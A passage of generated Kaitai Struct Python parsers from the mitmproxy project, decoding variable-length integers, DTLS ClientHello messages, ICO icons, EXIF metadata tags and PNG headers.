  class Group(KaitaiStruct):\n        \"\"\"One byte group, clearly divided into 7-bit \"value\" chunk and 1-bit \"continuation\" flag.\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.b = self._io.read_u1()\n\n        @property\n        def has_next(self):\n            \"\"\"If true, then we have more bytes to read.\"\"\"\n            if hasattr(self, '_m_has_next'):\n                return self._m_has_next\n\n            self._m_has_next = (self.b & 128) != 0\n            return getattr(self, '_m_has_next', None)\n\n        @property\n        def value(self):\n            \"\"\"The 7-bit (base128) numeric value chunk of this group.\"\"\"\n            if hasattr(self, '_m_value'):\n                return self._m_value\n\n            self._m_value = (self.b & 127)\n            return getattr(self, '_m_value', None)\n\n\n    @property\n    def len(self):\n        if hasattr(self, '_m_len'):\n            return self._m_len\n\n        self._m_len = len(self.groups)\n        return getattr(self, '_m_len', None)\n\n    @property\n    def value(self):\n        \"\"\"Resulting unsigned value as normal integer.\"\"\"\n        if hasattr(self, '_m_value'):\n            return self._m_value\n\n        self._m_value = (((((((self.groups[0].value + ((self.groups[1].value << 7) if self.len >= 2 else 0)) + ((self.groups[2].value << 14) if self.len >= 3 else 0)) + ((self.groups[3].value << 21) if self.len >= 4 else 0)) + ((self.groups[4].value << 28) if self.len >= 5 else 0)) + ((self.groups[5].value << 35) if self.len >= 6 else 0)) + ((self.groups[6].value << 42) if self.len >= 7 else 0)) + ((self.groups[7].value << 49) if self.len >= 8 else 0))\n        return getattr(self, '_m_value', None)\n\n    @property\n    def sign_bit(self):\n        if hasattr(self, '_m_sign_bit'):\n            return self._m_sign_bit\n\n        self._m_sign_bit = (1 << ((7 * self.len) - 1))\n        return getattr(self, '_m_sign_bit', None)\n\n    @property\n    def value_signed(self):\n        \"\"\"\n        .. seealso::\n           Source - https://graphics.stanford.edu/~seander/bithacks.html#VariableSignExtend\n        \"\"\"\n        if hasattr(self, '_m_value_signed'):\n            return self._m_value_signed\n\n        self._m_value_signed = ((self.value ^ self.sign_bit) - self.sign_bit)\n        return getattr(self, '_m_value_signed', None)\n\n\n", "mitmproxy/contrib/kaitaistruct/dtls_client_hello.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nclass DtlsClientHello(KaitaiStruct):\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.version = DtlsClientHello.Version(self._io, self, self._root)\n        self.random = DtlsClientHello.Random(self._io, self, self._root)\n        self.session_id = DtlsClientHello.SessionId(self._io, self, self._root)\n        self.cookie = DtlsClientHello.Cookie(self._io, self, self._root)\n        self.cipher_suites = DtlsClientHello.CipherSuites(self._io, self, self._root)\n        self.compression_methods = DtlsClientHello.CompressionMethods(self._io, self, self._root)\n        if self._io.is_eof() == False:\n            self.extensions = DtlsClientHello.Extensions(self._io, self, self._root)\n\n\n    class ServerName(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.name_type = self._io.read_u1()\n            self.length = self._io.read_u2be()\n            self.host_name = self._io.read_bytes(self.length)\n\n\n    class Random(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.gmt_unix_time = self._io.read_u4be()\n            self.random = self._io.read_bytes(28)\n\n\n    class SessionId(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u1()\n            self.sid = self._io.read_bytes(self.len)\n\n\n    class Sni(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.list_length = self._io.read_u2be()\n            self.server_names = []\n            i = 0\n            while not self._io.is_eof():\n                self.server_names.append(DtlsClientHello.ServerName(self._io, self, self._root))\n                i += 1\n\n\n\n    class CipherSuites(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u2be()\n            self.cipher_suites = []\n            for i in range(self.len // 2):\n                self.cipher_suites.append(self._io.read_u2be())\n\n\n\n    class CompressionMethods(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u1()\n            self.compression_methods = self._io.read_bytes(self.len)\n\n\n    class Alpn(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.ext_len = self._io.read_u2be()\n            self.alpn_protocols = []\n            i = 0\n            while not self._io.is_eof():\n                self.alpn_protocols.append(DtlsClientHello.Protocol(self._io, self, self._root))\n                i += 1\n\n\n\n    class Extensions(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u2be()\n            self.extensions = []\n            i = 0\n            while not self._io.is_eof():\n                self.extensions.append(DtlsClientHello.Extension(self._io, self, self._root))\n                i += 1\n\n\n\n    class Version(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.major = self._io.read_u1()\n            self.minor = self._io.read_u1()\n\n\n    class Cookie(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u1()\n            self.cookie = self._io.read_bytes(self.len)\n\n\n    class Protocol(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.strlen = self._io.read_u1()\n            self.name = self._io.read_bytes(self.strlen)\n\n\n    class Extension(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.type = self._io.read_u2be()\n            self.len = self._io.read_u2be()\n            _on = self.type\n            if _on == 0:\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = DtlsClientHello.Sni(_io__raw_body, self, self._root)\n            elif _on == 16:\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = DtlsClientHello.Alpn(_io__raw_body, self, self._root)\n            else:\n                self.body = self._io.read_bytes(self.len)\n\n\n\n", "mitmproxy/contrib/kaitaistruct/ico.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStruct\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nclass Ico(KaitaiStruct):\n    \"\"\"Microsoft Windows uses specific file format to store applications\n    icons - ICO. This is a container that contains one or more image\n    files (effectively, DIB parts of BMP files or full PNG files are\n    contained inside).\n    \n    .. seealso::\n       Source - https://docs.microsoft.com/en-us/previous-versions/ms997538(v=msdn.10)\n    \"\"\"\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.magic = self._io.read_bytes(4)\n        if not self.magic == b\"\\x00\\x00\\x01\\x00\":\n            raise kaitaistruct.ValidationNotEqualError(b\"\\x00\\x00\\x01\\x00\", self.magic, self._io, u\"/seq/0\")\n        self.num_images = self._io.read_u2le()\n        self.images = []\n        for i in range(self.num_images):\n            self.images.append(Ico.IconDirEntry(self._io, self, self._root))\n\n\n    class IconDirEntry(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.width = self._io.read_u1()\n            self.height = self._io.read_u1()\n            self.num_colors = self._io.read_u1()\n            self.reserved = self._io.read_bytes(1)\n            if not self.reserved == b\"\\x00\":\n                raise kaitaistruct.ValidationNotEqualError(b\"\\x00\", self.reserved, self._io, u\"/types/icon_dir_entry/seq/3\")\n            self.num_planes = self._io.read_u2le()\n            self.bpp = self._io.read_u2le()\n            self.len_img = self._io.read_u4le()\n            self.ofs_img = self._io.read_u4le()\n\n        @property\n        def img(self):\n            \"\"\"Raw image data. Use `is_png` to determine whether this is an\n            embedded PNG file (true) or a DIB bitmap (false) and call a\n            relevant parser, if needed to parse image data further.\n            \"\"\"\n            if hasattr(self, '_m_img'):\n                return self._m_img\n\n            _pos = self._io.pos()\n            self._io.seek(self.ofs_img)\n            self._m_img = self._io.read_bytes(self.len_img)\n            self._io.seek(_pos)\n            return getattr(self, '_m_img', None)\n\n        @property\n        def png_header(self):\n            \"\"\"Pre-reads first 8 bytes of the image to determine if it's an\n            embedded PNG file.\n            \"\"\"\n            if hasattr(self, '_m_png_header'):\n                return self._m_png_header\n\n            _pos = self._io.pos()\n            self._io.seek(self.ofs_img)\n            self._m_png_header = self._io.read_bytes(8)\n            self._io.seek(_pos)\n            return getattr(self, '_m_png_header', None)\n\n        @property\n        def is_png(self):\n            \"\"\"True if this image is in PNG format.\"\"\"\n            if hasattr(self, '_m_is_png'):\n                return self._m_is_png\n\n            self._m_is_png = self.png_header == b\"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\"\n            return getattr(self, '_m_is_png', None)\n\n\n\n", "mitmproxy/contrib/kaitaistruct/exif.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStream, KaitaiStruct\nfrom enum import Enum\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nclass Exif(KaitaiStruct):\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.endianness = self._io.read_u2le()\n        self.body = Exif.ExifBody(self._io, self, self._root)\n\n    class ExifBody(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            _on = self._root.endianness\n            if _on == 18761:\n                self._is_le = True\n            elif _on == 19789:\n                self._is_le = False\n            if not hasattr(self, '_is_le'):\n                raise kaitaistruct.UndecidedEndiannessError(\"/types/exif_body\")\n            elif self._is_le == True:\n                self._read_le()\n            elif self._is_le == False:\n                self._read_be()\n\n        def _read_le(self):\n            self.version = self._io.read_u2le()\n            self.ifd0_ofs = self._io.read_u4le()\n\n        def _read_be(self):\n            self.version = self._io.read_u2be()\n            self.ifd0_ofs = self._io.read_u4be()\n\n        class Ifd(KaitaiStruct):\n            def __init__(self, _io, _parent=None, _root=None, _is_le=None):\n                self._io = _io\n                self._parent = _parent\n                self._root = _root if _root else self\n                self._is_le = _is_le\n                self._read()\n\n            def _read(self):\n                if not hasattr(self, '_is_le'):\n                    raise kaitaistruct.UndecidedEndiannessError(\"/types/exif_body/types/ifd\")\n                elif self._is_le == True:\n                    self._read_le()\n                elif self._is_le == False:\n                    self._read_be()\n\n            def _read_le(self):\n                self.num_fields = self._io.read_u2le()\n                self.fields = []\n                for i in range(self.num_fields):\n                    self.fields.append(Exif.ExifBody.IfdField(self._io, self, self._root, self._is_le))\n\n                self.next_ifd_ofs = self._io.read_u4le()\n\n            def _read_be(self):\n                self.num_fields = self._io.read_u2be()\n                self.fields = []\n                for i in range(self.num_fields):\n                    self.fields.append(Exif.ExifBody.IfdField(self._io, self, self._root, self._is_le))\n\n                self.next_ifd_ofs = self._io.read_u4be()\n\n            @property\n            def next_ifd(self):\n                if hasattr(self, '_m_next_ifd'):\n                    return self._m_next_ifd\n\n                if self.next_ifd_ofs != 0:\n                    _pos = self._io.pos()\n                    self._io.seek(self.next_ifd_ofs)\n                    if self._is_le:\n                        self._m_next_ifd = Exif.ExifBody.Ifd(self._io, self, self._root, self._is_le)\n                    else:\n                        self._m_next_ifd = Exif.ExifBody.Ifd(self._io, self, self._root, self._is_le)\n                    self._io.seek(_pos)\n\n                return getattr(self, '_m_next_ifd', None)\n\n\n        class IfdField(KaitaiStruct):\n\n            class FieldTypeEnum(Enum):\n                byte = 1\n                ascii_string = 2\n                word = 3\n                dword = 4\n                rational = 5\n                undefined = 7\n                slong = 9\n                srational = 10\n\n            class TagEnum(Enum):\n                image_width = 256\n                image_height = 257\n                bits_per_sample = 258\n                compression = 259\n                photometric_interpretation = 262\n                thresholding = 263\n                cell_width = 264\n                cell_length = 265\n                fill_order = 266\n                document_name = 269\n                image_description = 270\n                make = 271\n                model = 272\n                strip_offsets = 273\n                orientation = 274\n                samples_per_pixel = 277\n                rows_per_strip = 278\n                strip_byte_counts = 279\n                min_sample_value = 280\n                max_sample_value = 281\n                x_resolution = 282\n                y_resolution = 283\n                planar_configuration = 284\n                page_name = 285\n                x_position = 286\n                y_position = 287\n                free_offsets = 288\n                free_byte_counts = 289\n                gray_response_unit = 290\n                gray_response_curve = 291\n                t4_options = 292\n                t6_options = 293\n                resolution_unit = 296\n                page_number = 297\n                color_response_unit = 300\n                transfer_function = 301\n                software = 305\n                modify_date = 306\n                artist = 315\n                host_computer = 316\n                predictor = 317\n                white_point = 318\n                primary_chromaticities = 319\n                color_map = 320\n                halftone_hints = 321\n                tile_width = 322\n                tile_length = 323\n                tile_offsets = 324\n                tile_byte_counts = 325\n                bad_fax_lines = 326\n                clean_fax_data = 327\n                consecutive_bad_fax_lines = 328\n                sub_ifd = 330\n                ink_set = 332\n                ink_names = 333\n                numberof_inks = 334\n                dot_range = 336\n                target_printer = 337\n                extra_samples = 338\n                sample_format = 339\n                s_min_sample_value = 340\n                s_max_sample_value = 341\n                transfer_range = 342\n                clip_path = 343\n                x_clip_path_units = 344\n                y_clip_path_units = 345\n                indexed = 346\n                jpeg_tables = 347\n                opi_proxy = 351\n                global_parameters_ifd = 400\n                profile_type = 401\n                fax_profile = 402\n                coding_methods = 403\n                version_year = 404\n                mode_number = 405\n                decode = 433\n                default_image_color = 434\n                t82_options = 435\n                jpeg_tables2 = 437\n                jpeg_proc = 512\n                thumbnail_offset = 513\n                thumbnail_length = 514\n                jpeg_restart_interval = 515\n                jpeg_lossless_predictors = 517\n                jpeg_point_transforms = 518\n                jpegq_tables = 519\n                jpegdc_tables = 520\n                jpegac_tables = 521\n                y_cb_cr_coefficients = 529\n                y_cb_cr_sub_sampling = 530\n                y_cb_cr_positioning = 531\n                reference_black_white = 532\n                strip_row_counts = 559\n                application_notes = 700\n                uspto_miscellaneous = 999\n                related_image_file_format = 4096\n                related_image_width = 4097\n                related_image_height = 4098\n                rating = 18246\n                xp_dip_xml = 18247\n                stitch_info = 18248\n                rating_percent = 18249\n                sony_raw_file_type = 28672\n                light_falloff_params = 28722\n                chromatic_aberration_corr_params = 28725\n                distortion_corr_params = 28727\n                image_id = 32781\n                wang_tag1 = 32931\n                wang_annotation = 32932\n                wang_tag3 = 32933\n                wang_tag4 = 32934\n                image_reference_points = 32953\n                region_xform_tack_point = 32954\n                warp_quadrilateral = 32955\n                affine_transform_mat = 32956\n                matteing = 32995\n                data_type = 32996\n                image_depth = 32997\n                tile_depth = 32998\n                image_full_width = 33300\n                image_full_height = 33301\n                texture_format = 33302\n                wrap_modes = 33303\n                fov_cot = 33304\n                matrix_world_to_screen = 33305\n                matrix_world_to_camera = 33306\n                model2 = 33405\n                cfa_repeat_pattern_dim = 33421\n                cfa_pattern2 = 33422\n                battery_level = 33423\n                kodak_ifd = 33424\n                copyright = 33432\n                exposure_time = 33434\n                f_number = 33437\n                md_file_tag = 33445\n                md_scale_pixel = 33446\n                md_color_table = 33447\n                md_lab_name = 33448\n                md_sample_info = 33449\n                md_prep_date = 33450\n                md_prep_time = 33451\n                md_file_units = 33452\n                pixel_scale = 33550\n                advent_scale = 33589\n                advent_revision = 33590\n                uic1_tag = 33628\n                uic2_tag = 33629\n                uic3_tag = 33630\n                uic4_tag = 33631\n                iptc_naa = 33723\n                intergraph_packet_data = 33918\n                intergraph_flag_registers = 33919\n                intergraph_matrix = 33920\n                ingr_reserved = 33921\n                model_tie_point = 33922\n                site = 34016\n                color_sequence = 34017\n                it8_header = 34018\n                raster_padding = 34019\n                bits_per_run_length = 34020\n                bits_per_extended_run_length = 34021\n                color_table = 34022\n                image_color_indicator = 34023\n                background_color_indicator = 34024\n                image_color_value = 34025\n                background_color_value = 34026\n                pixel_intensity_range = 34027\n                transparency_indicator = 34028\n                color_characterization = 34029\n                hc_usage = 34030\n                trap_indicator = 34031\n                cmyk_equivalent = 34032\n                sem_info = 34118\n                afcp_iptc = 34152\n                pixel_magic_jbig_options = 34232\n                jpl_carto_ifd = 34263\n                model_transform = 34264\n                wb_grgb_levels = 34306\n                leaf_data = 34310\n                photoshop_settings = 34377\n                exif_offset = 34665\n                icc_profile = 34675\n                tiff_fx_extensions = 34687\n                multi_profiles = 34688\n                shared_data = 34689\n                t88_options = 34690\n                image_layer = 34732\n                geo_tiff_directory = 34735\n                geo_tiff_double_params = 34736\n                geo_tiff_ascii_params = 34737\n                jbig_options = 34750\n                exposure_program = 34850\n                spectral_sensitivity = 34852\n                gps_info = 34853\n                iso = 34855\n                opto_electric_conv_factor = 34856\n                interlace = 34857\n                time_zone_offset = 34858\n                self_timer_mode = 34859\n                sensitivity_type = 34864\n                standard_output_sensitivity = 34865\n                recommended_exposure_index = 34866\n                iso_speed = 34867\n                iso_speed_latitudeyyy = 34868\n                iso_speed_latitudezzz = 34869\n                fax_recv_params = 34908\n                fax_sub_address = 34909\n                fax_recv_time = 34910\n                fedex_edr = 34929\n                leaf_sub_ifd = 34954\n                exif_version = 36864\n                date_time_original = 36867\n                create_date = 36868\n                google_plus_upload_code = 36873\n                offset_time = 36880\n                offset_time_original = 36881\n                offset_time_digitized = 36882\n                components_configuration = 37121\n                compressed_bits_per_pixel = 37122\n                shutter_speed_value = 37377\n                aperture_value = 37378\n                brightness_value = 37379\n                exposure_compensation = 37380\n                max_aperture_value = 37381\n                subject_distance = 37382\n                metering_mode = 37383\n                light_source = 37384\n                flash = 37385\n                focal_length = 37386\n                flash_energy = 37387\n                spatial_frequency_response = 37388\n                noise = 37389\n                focal_plane_x_resolution = 37390\n                focal_plane_y_resolution = 37391\n                focal_plane_resolution_unit = 37392\n                image_number = 37393\n                security_classification = 37394\n                image_history = 37395\n                subject_area = 37396\n                exposure_index = 37397\n                tiff_ep_standard_id = 37398\n                sensing_method = 37399\n                cip3_data_file = 37434\n                cip3_sheet = 37435\n                cip3_side = 37436\n                sto_nits = 37439\n                maker_note = 37500\n                user_comment = 37510\n                sub_sec_time = 37520\n                sub_sec_time_original = 37521\n                sub_sec_time_digitized = 37522\n                ms_document_text = 37679\n                ms_property_set_storage = 37680\n                ms_document_text_position = 37681\n                image_source_data = 37724\n                ambient_temperature = 37888\n                humidity = 37889\n                pressure = 37890\n                water_depth = 37891\n                acceleration = 37892\n                camera_elevation_angle = 37893\n                xp_title = 40091\n                xp_comment = 40092\n                xp_author = 40093\n                xp_keywords = 40094\n                xp_subject = 40095\n                flashpix_version = 40960\n                color_space = 40961\n                exif_image_width = 40962\n                exif_image_height = 40963\n                related_sound_file = 40964\n                interop_offset = 40965\n                samsung_raw_pointers_offset = 40976\n                samsung_raw_pointers_length = 40977\n                samsung_raw_byte_order = 41217\n                samsung_raw_unknown = 41218\n                flash_energy2 = 41483\n                spatial_frequency_response2 = 41484\n                noise2 = 41485\n                focal_plane_x_resolution2 = 41486\n                focal_plane_y_resolution2 = 41487\n                focal_plane_resolution_unit2 = 41488\n                image_number2 = 41489\n                security_classification2 = 41490\n                image_history2 = 41491\n                subject_location = 41492\n                exposure_index2 = 41493\n                tiff_ep_standard_id2 = 41494\n                sensing_method2 = 41495\n                file_source = 41728\n                scene_type = 41729\n                cfa_pattern = 41730\n                custom_rendered = 41985\n                exposure_mode = 41986\n                white_balance = 41987\n                digital_zoom_ratio = 41988\n                focal_length_in35mm_format = 41989\n                scene_capture_type = 41990\n                gain_control = 41991\n                contrast = 41992\n                saturation = 41993\n                sharpness = 41994\n                device_setting_description = 41995\n                subject_distance_range = 41996\n                image_unique_id = 42016\n                owner_name = 42032\n                serial_number = 42033\n                lens_info = 42034\n                lens_make = 42035\n                lens_model = 42036\n                lens_serial_number = 42037\n                gdal_metadata = 42112\n                gdal_no_data = 42113\n                gamma = 42240\n                expand_software = 44992\n                expand_lens = 44993\n                expand_film = 44994\n                expand_filter_lens = 44995\n                expand_scanner = 44996\n                expand_flash_lamp = 44997\n                pixel_format = 48129\n                transformation = 48130\n                uncompressed = 48131\n                image_type = 48132\n                image_width2 = 48256\n                image_height2 = 48257\n                width_resolution = 48258\n                height_resolution = 48259\n                image_offset = 48320\n                image_byte_count = 48321\n                alpha_offset = 48322\n                alpha_byte_count = 48323\n                image_data_discard = 48324\n                alpha_data_discard = 48325\n                oce_scanjob_desc = 50215\n                oce_application_selector = 50216\n                oce_id_number = 50217\n                oce_image_logic = 50218\n                annotations = 50255\n                print_im = 50341\n                original_file_name = 50547\n                uspto_original_content_type = 50560\n                dng_version = 50706\n                dng_backward_version = 50707\n                unique_camera_model = 50708\n                localized_camera_model = 50709\n                cfa_plane_color = 50710\n                cfa_layout = 50711\n                linearization_table = 50712\n                black_level_repeat_dim = 50713\n                black_level = 50714\n                black_level_delta_h = 50715\n                black_level_delta_v = 50716\n                white_level = 50717\n                default_scale = 50718\n                default_crop_origin = 50719\n                default_crop_size = 50720\n                color_matrix1 = 50721\n                color_matrix2 = 50722\n                camera_calibration1 = 50723\n                camera_calibration2 = 50724\n                reduction_matrix1 = 50725\n                reduction_matrix2 = 50726\n                analog_balance = 50727\n                as_shot_neutral = 50728\n                as_shot_white_xy = 50729\n                baseline_exposure = 50730\n                baseline_noise = 50731\n                baseline_sharpness = 50732\n                bayer_green_split = 50733\n                linear_response_limit = 50734\n                camera_serial_number = 50735\n                dng_lens_info = 50736\n                chroma_blur_radius = 50737\n                anti_alias_strength = 50738\n                shadow_scale = 50739\n                sr2_private = 50740\n                maker_note_safety = 50741\n                raw_image_segmentation = 50752\n                calibration_illuminant1 = 50778\n                calibration_illuminant2 = 50779\n                best_quality_scale = 50780\n                raw_data_unique_id = 50781\n                alias_layer_metadata = 50784\n                original_raw_file_name = 50827\n                original_raw_file_data = 50828\n                active_area = 50829\n                masked_areas = 50830\n                as_shot_icc_profile = 50831\n                as_shot_pre_profile_matrix = 50832\n                current_icc_profile = 50833\n                current_pre_profile_matrix = 50834\n                colorimetric_reference = 50879\n                s_raw_type = 50885\n                panasonic_title = 50898\n                panasonic_title2 = 50899\n                camera_calibration_sig = 50931\n                profile_calibration_sig = 50932\n                profile_ifd = 50933\n                as_shot_profile_name = 50934\n                noise_reduction_applied = 50935\n                profile_name = 50936\n                profile_hue_sat_map_dims = 50937\n                profile_hue_sat_map_data1 = 50938\n                profile_hue_sat_map_data2 = 50939\n                profile_tone_curve = 50940\n                profile_embed_policy = 50941\n                profile_copyright = 50942\n                forward_matrix1 = 50964\n                forward_matrix2 = 50965\n                preview_application_name = 50966\n                preview_application_version = 50967\n                preview_settings_name = 50968\n                preview_settings_digest = 50969\n                preview_color_space = 50970\n                preview_date_time = 50971\n                raw_image_digest = 50972\n                original_raw_file_digest = 50973\n                sub_tile_block_size = 50974\n                row_interleave_factor = 50975\n                profile_look_table_dims = 50981\n                profile_look_table_data = 50982\n                opcode_list1 = 51008\n                opcode_list2 = 51009\n                opcode_list3 = 51022\n                noise_profile = 51041\n                time_codes = 51043\n                frame_rate = 51044\n                t_stop = 51058\n                reel_name = 51081\n                original_default_final_size = 51089\n                original_best_quality_size = 51090\n                original_default_crop_size = 51091\n                camera_label = 51105\n                profile_hue_sat_map_encoding = 51107\n                profile_look_table_encoding = 51108\n                baseline_exposure_offset = 51109\n                default_black_render = 51110\n                new_raw_image_digest = 51111\n                raw_to_preview_gain = 51112\n                default_user_crop = 51125\n                padding = 59932\n                offset_schema = 59933\n                owner_name2 = 65000\n                serial_number2 = 65001\n                lens = 65002\n                kdc_ifd = 65024\n                raw_file = 65100\n                converter = 65101\n                white_balance2 = 65102\n                exposure = 65105\n                shadows = 65106\n                brightness = 65107\n                contrast2 = 65108\n                saturation2 = 65109\n                sharpness2 = 65110\n                smoothness = 65111\n                moire_filter = 65112\n            def __init__(self, _io, _parent=None, _root=None, _is_le=None):\n                self._io = _io\n                self._parent = _parent\n                self._root = _root if _root else self\n                self._is_le = _is_le\n                self._read()\n\n            def _read(self):\n                if not hasattr(self, '_is_le'):\n                    raise kaitaistruct.UndecidedEndiannessError(\"/types/exif_body/types/ifd_field\")\n                elif self._is_le == True:\n                    self._read_le()\n                elif self._is_le == False:\n                    self._read_be()\n\n            def _read_le(self):\n                self.tag = KaitaiStream.resolve_enum(Exif.ExifBody.IfdField.TagEnum, self._io.read_u2le())\n                self.field_type = KaitaiStream.resolve_enum(Exif.ExifBody.IfdField.FieldTypeEnum, self._io.read_u2le())\n                self.length = self._io.read_u4le()\n                self.ofs_or_data = self._io.read_u4le()\n\n            def _read_be(self):\n                self.tag = KaitaiStream.resolve_enum(Exif.ExifBody.IfdField.TagEnum, self._io.read_u2be())\n                self.field_type = KaitaiStream.resolve_enum(Exif.ExifBody.IfdField.FieldTypeEnum, self._io.read_u2be())\n                self.length = self._io.read_u4be()\n                self.ofs_or_data = self._io.read_u4be()\n\n            @property\n            def type_byte_length(self):\n                if hasattr(self, '_m_type_byte_length'):\n                    return self._m_type_byte_length\n\n                self._m_type_byte_length = (2 if self.field_type == Exif.ExifBody.IfdField.FieldTypeEnum.word else (4 if self.field_type == Exif.ExifBody.IfdField.FieldTypeEnum.dword else 1))\n                return getattr(self, '_m_type_byte_length', None)\n\n            @property\n            def byte_length(self):\n                if hasattr(self, '_m_byte_length'):\n                    return self._m_byte_length\n\n                self._m_byte_length = (self.length * self.type_byte_length)\n                return getattr(self, '_m_byte_length', None)\n\n            @property\n            def is_immediate_data(self):\n                if hasattr(self, '_m_is_immediate_data'):\n                    return self._m_is_immediate_data\n\n                self._m_is_immediate_data = self.byte_length <= 4\n                return getattr(self, '_m_is_immediate_data', None)\n\n            @property\n            def data(self):\n                if hasattr(self, '_m_data'):\n                    return self._m_data\n\n                if not (self.is_immediate_data):\n                    io = self._root._io\n                    _pos = io.pos()\n                    io.seek(self.ofs_or_data)\n                    if self._is_le:\n                        self._m_data = io.read_bytes(self.byte_length)\n                    else:\n                        self._m_data = io.read_bytes(self.byte_length)\n                    io.seek(_pos)\n\n                return getattr(self, '_m_data', None)\n\n\n        @property\n        def ifd0(self):\n            if hasattr(self, '_m_ifd0'):\n                return self._m_ifd0\n\n            _pos = self._io.pos()\n            self._io.seek(self.ifd0_ofs)\n            if self._is_le:\n                self._m_ifd0 = Exif.ExifBody.Ifd(self._io, self, self._root, self._is_le)\n            else:\n                self._m_ifd0 = Exif.ExifBody.Ifd(self._io, self, self._root, self._is_le)\n            self._io.seek(_pos)\n            return getattr(self, '_m_ifd0', None)\n\n\n\n", "mitmproxy/contrib/kaitaistruct/png.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO\nfrom enum import Enum\nimport zlib\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nclass Png(KaitaiStruct):\n    \"\"\"Test files for APNG can be found at the following locations:\n    \n      * <https://philip.html5.org/tests/apng/tests.html>\n      * <http://littlesvr.ca/apng/>\n    \"\"\"\n\n    class PhysUnit(Enum):\n        unknown = 0\n        meter = 1\n\n    class BlendOpValues(Enum):\n        source = 0\n        over = 1\n\n    class CompressionMethods(Enum):\n        zlib = 0\n\n    class DisposeOpValues(Enum):\n        none = 0\n        background = 1\n        previous = 2\n\n    class ColorType(Enum):\n        greyscale = 0\n        truecolor = 2\n        indexed = 3\n        greyscale_alpha = 4\n        truecolor_alpha = 6\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.magic = self._io.read_bytes(8)\n        if not self.magic == b\"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\":\n            raise 